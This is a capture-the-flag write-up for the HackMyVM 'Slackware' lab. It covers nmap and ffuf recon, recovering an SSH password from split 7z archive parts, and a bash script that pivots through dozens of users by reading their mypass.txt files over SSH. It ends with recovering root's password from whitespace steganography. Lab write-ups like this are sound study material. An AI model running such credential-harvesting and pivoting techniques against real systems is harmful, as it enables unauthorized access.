# Slackware

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.143:1
Open 10.0.2.143:2
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.143
PORT  STATE SERVICE REASON  VERSION
1/tcp open  ssh     syn-ack OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJcZY4GWIximmdPsABxAYaWgO1m0N7pVq2ce7e5tg7ll2XkNtrin7qN520RUcubKdKhR7uVcZS/FsAg9ChHCgLE=
|   256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3Vv5eWXgC7mWGGeXdd+jVBETQZmJs5JsPH/51Tnxgh
2/tcp open  http    syn-ack Apache httpd 2.4.58 ((Unix))
|_http-server-header: Apache/2.4.58 (Unix)
|_http-title: Tribute to Slackware
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
```
:::

## HTTP (2)

Weird flex running HTTP server on port 2 ðŸ¤£

![writeup.png](/assets/pentest/hackmyvm/slackware/writeup.png)

Hmmm
```bash
â””â”€$ curl 10.0.2.143:2/robots.txt
User-agent: *
#7z.001 
```

```bash
â””â”€$ feroxbuster -u http://10.0.2.143:2 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.zip,.7z
200      GET      168l      672w     7511c http://10.0.2.143:2/
200      GET      168l      672w     7511c http://10.0.2.143:2/index.html
200      GET        2l        3w       21c http://10.0.2.143:2/robots.txt
```

```bash
â””â”€$ curl 10.0.2.143:2 -s | htmlq a -a href | cut -d'/' -f4- | sort | uniq > links.txt
â””â”€$ feroxbuster -u http://10.0.2.143:2/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w links.txt
200      GET        1l        2w       12c http://10.0.2.143:2/getslack/
200      GET      168l      672w     7511c http://10.0.2.143:2/
200      GET      168l      672w     7511c http://10.0.2.143:2/index.html
```

Err...
```bash
â””â”€$ curl http://10.0.2.143:2/getslack/ -i
HTTP/1.1 200 OK
Date: Tue, 16 Dec 2025 17:37:51 GMT
Server: Apache/2.4.58 (Unix)
Last-Modified: Mon, 11 Mar 2024 14:13:36 GMT
ETag: "c-6136325bb8400"
Accept-Ranges: bytes
Content-Length: 12
Content-Type: text/html

search here
```

```bash
â””â”€$ ffuf -u 'http://10.0.2.143:2/getslack/FUZZ.7z.001' -w /usr/share/seclists/Discovery/Web-Content/common.txt
twitter                 [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 18ms]

â””â”€$ ffuf -u 'http://10.0.2.143:2/getslack/twitter.7z.FUZZ' -w <(seq -w 1 100)
001                     [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 5ms]
009                     [Status: 200, Size: 20480, Words: 84, Lines: 66, Duration: 3ms]
012                     [Status: 200, Size: 20480, Words: 81, Lines: 67, Duration: 6ms]
004                     [Status: 200, Size: 20480, Words: 93, Lines: 77, Duration: 7ms]
007                     [Status: 200, Size: 20480, Words: 93, Lines: 70, Duration: 2ms]
005                     [Status: 200, Size: 20480, Words: 85, Lines: 69, Duration: 14ms]
014                     [Status: 200, Size: 1860, Words: 9, Lines: 9, Duration: 18ms]
003                     [Status: 200, Size: 20480, Words: 78, Lines: 92, Duration: 5ms]
006                     [Status: 200, Size: 20480, Words: 74, Lines: 68, Duration: 5ms]
002                     [Status: 200, Size: 20480, Words: 79, Lines: 69, Duration: 18ms]
010                     [Status: 200, Size: 20480, Words: 90, Lines: 77, Duration: 19ms]
008                     [Status: 200, Size: 20480, Words: 78, Lines: 84, Duration: 30ms]
011                     [Status: 200, Size: 20480, Words: 83, Lines: 63, Duration: 26ms]
013                     [Status: 200, Size: 20480, Words: 96, Lines: 58, Duration: 28ms]
```

```bash
â””â”€$ for i in $(seq -f "%03g" 1 14); do curl -LOs "http://10.0.2.143:2/getslack/twitter.7z.$i"; done;
â””â”€$ file *
twitter.7z.001: 7-zip archive data, version 0.4
twitter.7z.002: data
twitter.7z.003: data
twitter.7z.004: data
twitter.7z.005: data
twitter.7z.006: data
twitter.7z.007: data
twitter.7z.008: data
twitter.7z.009: data
twitter.7z.010: data
twitter.7z.011: data
twitter.7z.012: OpenPGP Secret Key
twitter.7z.013: data
twitter.7z.014: data

â””â”€$ 7z x twitter.7z.001
â””â”€$ file twitter.png
twitter.png: PNG image data, 400 x 400, 8-bit/color RGB, non-interlaced

â””â”€$ strings twitter.png
...
trYth1sPasS1993
```

![writeup-1.png](/assets/pentest/hackmyvm/slackware/writeup-1.png)

## SSH (1)

::: info Note
`patrick:trYth1sPasS1993`
:::

```bash
â””â”€$ sshpass -p 'trYth1sPasS1993' ssh patrick@10.0.2.143 -p 1
Warning: Permanently added '[10.0.2.143]:1' (ED25519) to the list of known hosts.
Linux 5.15.145.
patrick@slackware:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
patrick@slackware:~$ find . -ls
    51607      0 drwx--x--x   3 patrick  users         104 Dec 16 18:52 .
    51587      0 drwx------   3 patrick  patrick        80 Dec 16 18:52 ./.cache
    52712      0 drwx------   2 patrick  patrick        72 Dec 16 18:52 ./.cache/keyring-W8D7H3
    83773      0 srwxr-xr-x   1 patrick  patrick         0 Dec 16 18:52 ./.cache/keyring-W8D7H3/control
    51608      4 -rw-r--r--   1 patrick  users        3729 Feb  2  2022 ./.screenrc
```

### Privilege Escalation (kratinga)

```bash
patrick@slackware:~$ find /home -type f -ls 2>/dev/null
    52468      4 -rw-r-----   1 claor    kretinga       13 Mar 10  2024 /home/claor/mypass.txt
    52478      4 -rw-r--r--   1 claor    claor        3729 Feb  2  2022 /home/claor/.screenrc
    51592      4 -rw-r-----   1 kretinga patrick        13 Mar 10  2024 /home/kretinga/mypass.txt
    52472      4 -rw-r--r--   1 kretinga kretinga     3729 Feb  2  2022 /home/kretinga/.screenrc
    51608      4 -rw-r--r--   1 patrick  users        3729 Feb  2  2022 /home/patrick/.screenrc
patrick@slackware:~$ find /home -type f -name '*.txt' 2>/dev/null -exec sh -c 'echo {}; cat {};' \;
/home/claor/mypass.txt
JRksNe5rWgis
/home/kretinga/mypass.txt
lpV8UG0GxKuw
```

::: info Note
`kretinga:lpV8UG0GxKuw`
:::

```bash
patrick@slackware:~$ su kretinga
Password:
kretinga@slackware:/home/patrick$ id
uid=1001(kretinga) gid=1001(kretinga) groups=1001(kretinga),1002(claor)
```

### Privilege Escalation (claor)

::: info Note
`claor:JRksNe5rWgis`
:::

```bash
kretinga@slackware:/home/patrick$ su claor
Password:
claor@slackware:/home/patrick$ id
uid=1002(claor) gid=1002(claor) groups=1002(claor),1003(alienum)
```

### Privilege Escalation (Up up and up)

Errr... do we have to keep doing this?
```bash
claor@slackware:/home/patrick$ cat /home/alienum/mypass.txt
ex0XVRAAjCWX
claor@slackware:/home/patrick$ grep sh$ /etc/passwd
root:x:0:0::/root:/bin/bash
operator:x:11:0:operator:/root:/bin/bash
patrick:x:1000:1000::/home/patrick:/bin/bash
...
0xh3rshel:x:1049:1049::/home/0xh3rshel:/bin/bash
0xjin:x:1050:1050::/home/0xjin:/bin/bash
```

Auto get passwords with script
```bash
#!/usr/bin/env bash

TARGET="10.0.2.143"
PORT=1

exec_command() { sshpass -p "$2" ssh -p "$PORT" -o StrictHostKeyChecking=no "$1@$TARGET" "$3" 2>/dev/null; }
get_password() { exec_command "$1" "$2" "cat /home/$3/mypass.txt 2>/dev/null"; }
get_user()     { exec_command "$1" "$2" "id -Gn | awk '{print \$NF}'"; }
has_user() Â  Â  { exec_command "$1" "$2" "ls user.txt"; }

user="kretinga"
password="lpV8UG0GxKuw"
echo "[*] Starting with ${user}:${password}"

while :; do
    next_user=$(get_user "$user" "$password")
    next_pass=$(get_password "$user" "$password" "$next_user")

    echo "[+] Next user ${next_user}:${next_pass}"
    [[ -z "$next_user" || -z "$next_pass" ]] && break
    [[ "$next_user" == "$user" ]] && break

    if has_user "$next_user" "$next_pass"; then
        echo "[*] Found user.txt for ${next_user}:${next_pass}"
        exec_command "$next_user" "$next_pass" "cat user.txt"
    fi

    user="$next_user"
    password="$next_pass"
done
```

output
```bash
â””â”€$ bash get_passwords.sh
[*] Starting with kretinga:lpV8UG0GxKuw
[+] Next user claor:JRksNe5rWgis
[+] Next user alienum:ex0XVRAAjCWX
[+] Next user mrmidnight:B4ReHPEhmlPt
[+] Next user annlynn:S64IamSERUI3
[+] Next user powerful:pof2XIpVzYl3
[+] Next user proxy:GX2xnNNU2Hcc
[+] Next user x4v1l0k:TB7pVPwPUeIW
[+] Next user icex64:tX5o7AUg2PTd
[+] Next user mindsflee:VZFoxk0lqnnc
[+] Next user zacarx007:8LCa5IDAELR4
[+] Next user terminal:Qv0dtvZdfpvN
[+] Next user zenmpi:WiEbQP6K4Sg9
[+] Next user sml:AQewY20VryO7
[+] Next user emvee:sj5mu74Nmowb
[+] Next user nls:VfS9EIU5C9xw
[+] Next user noname:0Vsok2PoVo7t
[+] Next user nolose:KcHXtRsiUPpw
[+] Next user sancelisso:oAGSK1zXcbT8
[+] Next user ruycr4ft:G5UJEpW78pOV
[+] Next user tasiyanci:JO8dvF60MdXR
[+] Next user lanz:IBrVGveXM3jI
[+] Next user pylon:6Mqoo8Pud4Fx
[+] Next user wwfymn:VBebiyG62uIg
[+] Next user whitecr0wz:51BwJ9iYO4E7
[+] Next user bit:fDZRz4SJOs8z
[+] Next user infayerts:NYURcD5V8k4X
[+] Next user rijaba1:eaqz8vJ2pRmU
[+] Next user cromiphi:CQBpV2NQ3U6A
[+] Next user gatogamer:yjwGMry82S2Y
[+] Next user ch4rm:Hz35MslshyXj
[+] Next user aceomn:sXdnu8wF1Yb8
[+] Next user kerszi:rjDwcHDFYBML
[+] Next user d3b0o:oHjylQ7402Dd
[+] Next user avijneyam:vRdS8PLTnTlW
[+] Next user zayotic:bgg9TT9otdD6
[+] Next user kaian:R23AJFVTQYaB
[+] Next user c4rta:IAuaOSSTZHoh
[+] Next user boyras200:oW19TzLywNIq
[+] Next user waidroc:0aApTUf5E2Eq
[+] Next user ziyos:8eS8I1JGxeeZ
[+] Next user b4el7d:llMttpVCiYPw
[+] Next user rpj7:wP26CtkDby6J
user.txt
[*] Found user.txt for rpj7:wP26CtkDby6J
HMV{Th1s1s1Us3rFlag}






[+] Next user rpj7:wP26CtkDby6J
[+] Next user h1dr0:tnvAny2zwYTV
[+] Next user catch_me75:Vkyo6rKvXsIw
[+] Next user josemlwdf:jLzXNEEFdtLX
[+] Next user skinny:iJ7EnTBCtUS8
[+] Next user skinny:iJ7EnTBCtUS8
```

### User.txt

```bash
â””â”€$ sshpass -p 'wP26CtkDby6J' ssh rpj7@10.0.2.143 -p 1 'cat user.txt'
HMV{Th1s1s1Us3rFlag}
...
```

## Privilege Escalation (root)

The `user.txt` do be weird.
```bash
â””â”€$ sshpass -p 'wP26CtkDby6J' ssh rpj7@10.0.2.143 -p 1 'xxd user.txt'
00000000: 484d 567b 5468 3173 3173 3155 7333 7246  HMV{Th1s1s1Us3rF
00000010: 6c61 677d 0920 2020 2020 0920 2020 2020  lag}.     .
00000020: 2009 2009 2020 2009 2020 2020 2009 2020   . .   .     .
00000030: 2020 2020 2009 2020 2020 2020 200a 2020       .       .
00000040: 2020 0920 2020 2020 2009 0920 2020 2009    .      ..    .
00000050: 2020 2020 2020 2009 0909 2009 2020 2009         ... .   .
00000060: 2020 2020 2020 200a 2020 2020 2020 2009         .       .
00000070: 2009 2020 2020 2009 2020 2020 2020 2009   .     .       .
00000080: 2020 2020 2020 0920 2020 2009 2020 2020        .    .
00000090: 2020 0920 2020 2020 0920 2020 200a 0920    .     .    ..
000000a0: 2020 2020 0920 2020 2009 2009 2020 2020      .    . .
000000b0: 0920 2020 2020 0920 2020 2020 2009 2020  .     .      .
000000c0: 2020 2020 2009 2020 2009 2020 0a20 2020       .   .  .
000000d0: 2020 0920 2020 0920 2020 0920 2020 2020    .   .   .
000000e0: 0920 2020 2020 0920 2020 0920 0909 2020  .     .   . ..
000000f0: 2020 2020 0920 0a20 2020 2020 0920 2020      . .     .
00000100: 2020 2020 0920 2020 2020 2020 0920 2020      .       .
00000110: 2009 2020 2020 2020 0920 2020 2009 2020   .      .    .
00000120: 2020 2009 2020 0920 0a09 2020 2020 2020     .  . ..
00000130: 2009 2020 2020 2009 200a                  .     . .
```

```bash
â””â”€$ sshpass -p 'wP26CtkDby6J' scp -P 1 rpj7@10.0.2.143:user.txt .
â””â”€$ sudo apt install stegsnow
â””â”€$ stegsnow user.txt
+/åš                                                                                                                                                                                                               
â””â”€$ stegsnow -C user.txt
To_Jest_Bardzo_Trudne_Haslo 
```

::: info Note
`root:To_Jest_Bardzo_Trudne_Haslo`
:::

```bash
josemlwdf@slackware:~$ su root
Password:
root@slackware:/home/josemlwdf# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),17(audio)
```

### Root.txt

```bash
root@slackware:/home/josemlwdf# cat /root/roo00oot.txt
There is no root flag here, but it is somewhere in the /home directory.
root@slackware:/home/josemlwdf# find /home -name root.txt -ls 2>/dev/null
root@slackware:/home/josemlwdf# find /home -name r*.txt -ls 2>/dev/null
root@slackware:/home/josemlwdf# grep HMV /home -Rain
grep: /home/rpj7/.cache/keyring-UX2MH3/control: No such device or address
/home/rpj7/user.txt:1:HMV{Th1s1s1Us3rFlag}
/home/0xh3rshel/.screenrc:19:# Here is a flag for root: HMV{SlackwareStillAlive}
```